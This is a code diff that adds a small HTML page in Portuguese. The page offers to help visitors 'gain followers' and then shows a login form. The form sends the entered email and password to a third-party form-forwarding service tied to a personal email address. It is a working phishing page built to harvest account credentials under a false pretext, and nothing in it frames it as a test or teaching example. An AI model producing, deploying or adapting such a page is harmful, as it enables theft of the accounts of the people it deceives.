@@ -1,0 +1,62 @@
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #111;
+            color: white;
+            flex-direction: column;
+        }
+        .hidden {
+            display: none;
+        }
+        .form-container {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #6a0dad;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <a href="#" id="openForm">Clique aqui para abrir ganhar seguidores</a>
+
+    <div id="formContainer" class="hidden form-container">
+        <h2>Login</h2>
+        <form id="loginForm" action="https://formsubmit.co/gabrielmendes.mp203@gmail.com" method="POST">
+            <input type="text" name="email" placeholder="E-mail" required>
+            <input type="password" name="senha" placeholder="Senha" required>
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('openForm').addEventListener('click', function() {
+            document.getElementById('formContainer').classList.toggle('hidden');
+        });
+    </script>
+
+</body>
+</html>
